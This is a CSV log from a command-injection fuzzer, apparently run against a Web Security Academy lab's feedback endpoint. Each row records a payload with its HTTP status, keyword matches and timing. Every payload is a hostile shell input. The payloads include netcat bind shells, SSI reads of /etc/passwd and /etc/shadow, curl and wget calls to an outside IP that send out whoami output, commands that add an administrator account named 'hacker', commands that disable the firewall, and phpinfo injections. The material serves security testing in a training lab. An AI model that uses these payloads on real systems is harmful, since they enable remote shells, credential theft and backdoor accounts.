id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,168,| ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,169,; ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,170,& ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,171,&& ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,172,ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,173,*; ls -lhtR /var/www/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,174,| ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,175,; ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,176,& ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,177,&& ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,178,ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,179,| ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,180,; ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,181,& ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,182,&& ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,183,ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,184,"<!--#exec cmd=""/bin/cat /etc/passwd""-->",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,185,"<!--#exec cmd=""/bin/cat /etc/shadow""-->",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,186,"<!--#exec cmd=""/usr/bin/id;-->",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,187,"
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,188,"
\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,189,"
\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,190,"
/bin/ls -al
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,191,| nc -lvvp 4444 -e /bin/sh|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,192,; nc -lvvp 4444 -e /bin/sh;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,193,& nc -lvvp 4444 -e /bin/sh&,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,194,&& nc -lvvp 4444 -e /bin/sh &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,195,nc -lvvp 4444 -e /bin/sh,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,196,nc -lvvp 4445 -e /bin/sh &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,197,nc -lvvp 4446 -e /bin/sh|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,198,nc -lvvp 4447 -e /bin/sh;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,199,nc -lvvp 4448 -e /bin/sh&,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,200,"
echo INJECTX
exit
\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,201,"
echo INJECTX
exit
\033[2Asleep 5
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,202,"
echo INJECTX
exit
\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,203,| net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,204,; net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,205,& net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,206,&& net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,207,net localgroup Administrators hacker /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,208,| netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,209,; netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,210,& netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,211,&& netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,212,netsh firewall set opmode disable,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,213,netstat,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,214,;netstat -a;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,215,| netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,216,; netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,217,& netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,218,&& netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,219,netstat -an,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,220,| net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,221,; net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,222,& net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,223,&& net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,224,net user hacker Password1 /ADD,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,225,| net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,226,; net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,227,& net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,228,&& net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,229,net view,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,230,"
id|",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,231,"
id;",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,232,"
id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,233,"
/usr/bin/id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,234,"perl -e 'print ""X""x1024'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,235,"|| perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,236,"| perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,237,"; perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,238,"& perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,239,"&& perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,240,"perl -e 'print ""X""x16384'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,241,"; perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,242,"& perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,243,"&& perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,244,"perl -e 'print ""X""x2048'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,245,"|| perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,246,"| perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,247,"; perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,248,"& perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,249,"&& perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,250,"perl -e 'print ""X""x4096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,251,"|| perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,252,"| perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,253,"; perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,254,"&& perl -e 'print ""X""x8096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,255,"perl -e 'print ""X""x8192'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,256,"perl -e 'print ""X""x81920'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,257,|| phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,258,| phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,259, {${phpinfo()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,260,;phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,261,;phpinfo();//,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,262,';phpinfo();//,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,263,{${phpinfo()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,264,& phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,265,&& phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,266,phpinfo(),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
